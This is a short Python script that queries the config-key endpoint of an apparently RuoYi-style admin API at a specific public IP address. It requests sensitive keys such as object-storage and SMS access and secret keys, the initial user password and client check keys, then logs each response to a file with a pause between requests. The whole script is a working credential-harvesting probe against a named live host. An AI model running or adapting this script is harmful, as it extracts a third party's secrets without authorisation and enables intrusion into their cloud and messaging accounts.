import urllib.request, urllib.error, time, json, sys
base="http://144.123.22.234:9080/prod-api"
keys=["sys.account.captchaEnabled","sys.account.registerUser","sys.user.initPassword",
"sys.index.skinName","sys.index.sideTheme","sys.oss.previewListResource","sys.login.blackIPList",
"sys.oss.accessKey","sys.oss.secretKey","sys.sms.accessKey","sys.sms.secretKey","sys.client.checkKey",
"sys.jydsj.checkKey","sys.account.maxRetryCount"]
log=open("cfgkeys.log","a")
for k in keys:
    url=base+"/system/config/configKey/"+k
    req=urllib.request.Request(url, method="GET")
    try:
        r=urllib.request.urlopen(req, timeout=15)
        body=r.read().decode("utf-8","replace")
        st=r.status
    except urllib.error.HTTPError as e:
        st=e.code; body=e.read().decode("utf-8","replace")
    except Exception as e:
        st="ERR"; body=str(e)
    line=f"[{st}] {k} :: {body[:400]}"
    print(line); log.write(line+"\n"); log.flush()
    time.sleep(1.6)
log.close()
